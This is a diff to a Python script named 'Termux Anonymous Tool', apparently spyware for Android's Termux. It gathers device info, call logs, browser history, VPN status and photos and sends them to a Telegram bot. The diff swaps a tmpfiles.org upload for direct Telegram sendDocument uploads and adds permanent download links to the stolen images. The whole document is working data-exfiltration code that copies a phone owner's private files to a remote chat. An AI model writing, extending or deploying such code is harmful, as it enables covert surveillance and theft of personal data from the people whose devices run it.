@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Termux Anonymous Tool v3.0 - Telegram Version
-All Features Working - No Errors
+Termux Anonymous Tool v3.0 - Telegram Direct Upload Version
+All Features Working - No Expiry!
 """
 
 import os
@@ -96,35 +96,72 @@ def send_to_telegram(message):
         return False
 
 def send_file_to_telegram(file_path, caption=""):
-    """Send file to Telegram"""
-    try:
-        if not os.path.exists(file_path):
-            return False
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-        with open(file_path, 'rb') as f:
-            files = {'document': f}
-            data = {'chat_id': CHAT_ID, 'caption': caption}
-            response = requests.post(url, files=files, data=data, timeout=120)
-        if response.status_code == 200:
-            return True
-        return False
-    except Exception as e:
-        print(f"[!] Error sending file: {e}")
-        return False
-
-# ========== CLOUD UPLOAD ==========
-def upload_to_cloud(file_path, folder_name):
-    """Upload file to tmpfiles.org"""
+    """Send file directly to Telegram (PERMANENT - No Expiry!)"""
     try:
         if not os.path.exists(file_path):
             return None
-        url = "https://tmpfiles.org/api/v1/upload"
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(file_path, 'rb') as f:
-            files = {'file': (os.path.basename(file_path), f)}
-            response = requests.post(url, files=files, timeout=120)
+            files = {'document': f}
+            data = {
+                'chat_id': CHAT_ID,
+                'caption': caption if caption else f"📷 {os.path.basename(file_path)}"
+            }
+            response = requests.post(url, files=files, data=data, timeout=120)
+        
         if response.status_code == 200:
-            data = response.json()
-            return data.get('data', {}).get('url', '')
+            result = response.json()
+            # Get file_id from response
+            file_id = result.get('result', {}).get('document', {}).get('file_id')
+            if file_id:
+                # Get download URL (permanent)
+                file_info = requests.get(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
+                ).json()
+                file_path_telegram = file_info.get('result', {}).get('file_path')
+                if file_path_telegram:
+                    download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_telegram}"
+                    print(f"[✓] Uploaded to Telegram: {os.path.basename(file_path)}")
+                    return download_url
+            return None
+        return None
+    except Exception as e:
+        print(f"[!] Error sending file to Telegram: {e}")
+        return None
+
+# ========== UPLOAD TO TELEGRAM (PERMANENT - REPLACES tmpfiles.org) ==========
+def upload_to_cloud(file_path, folder_name):
+    """
+    Upload file directly to Telegram (PERMANENT - No Expiry!)
+    This REPLACES tmpfiles.org completely
+    """
+    try:
+        if not os.path.exists(file_path):
+            return None
+        
+        # Send directly to Telegram
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {
+                'chat_id': CHAT_ID,
+                'caption': f"📁 {folder_name} - {os.path.basename(file_path)}"
+            }
+            response = requests.post(url, files=files, data=data, timeout=120)
+        
+        if response.status_code == 200:
+            result = response.json()
+            file_id = result.get('result', {}).get('document', {}).get('file_id')
+            if file_id:
+                # Get permanent download URL
+                file_info = requests.get(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
+                ).json()
+                file_path_telegram = file_info.get('result', {}).get('file_path')
+                if file_path_telegram:
+                    download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_telegram}"
+                    return download_url
         return None
     except Exception as e:
         print(f"[!] Upload error: {e}")
@@ -149,7 +186,7 @@ def get_device_info():
         "timestamp": datetime.now().isoformat()
     }
 
-# ========== FEATURE FUNCTIONS (WITH 30 SECOND TIMEOUT) ==========
+# ========== FEATURE FUNCTIONS ==========
 def run_termux_command(cmd, timeout=30):
     """Run termux command with better error handling"""
     try:
@@ -411,8 +448,8 @@ def send_all_data_to_telegram():
     print("[*] Checking VPN...")
     vpn = detect_vpn()
     
-    # Upload images to cloud
-    print("[*] Uploading images...")
+    # Upload images to Telegram (PERMANENT - No Expiry!)
+    print("[*] Uploading images to Telegram (Permanent)...")
     uploaded_images = []
     for img_path in images[:10]:
         try:
@@ -422,7 +459,8 @@ def send_all_data_to_telegram():
                     'filename': os.path.basename(img_path),
                     'url': url
                 })
-            time.sleep(1)
+                print(f"[✓] Uploaded: {os.path.basename(img_path)}")
+            time.sleep(1)  # Rate limit
         except Exception as e:
             print(f"[!] Upload error: {e}")
     
@@ -479,7 +517,7 @@ def send_all_data_to_telegram():
 📞 *Call Logs:* {len(call_logs)} entries
 🌐 *Browser History:* {len(browser_history)} entries
 
-📎 *Image Downloads:*"""
+📎 *Image Downloads (Permanent - No Expiry!):*"""
     
     for i, img in enumerate(uploaded_images[:5], 1):
         message += f"\n{i}. [{img['filename']}]({img['url']})"
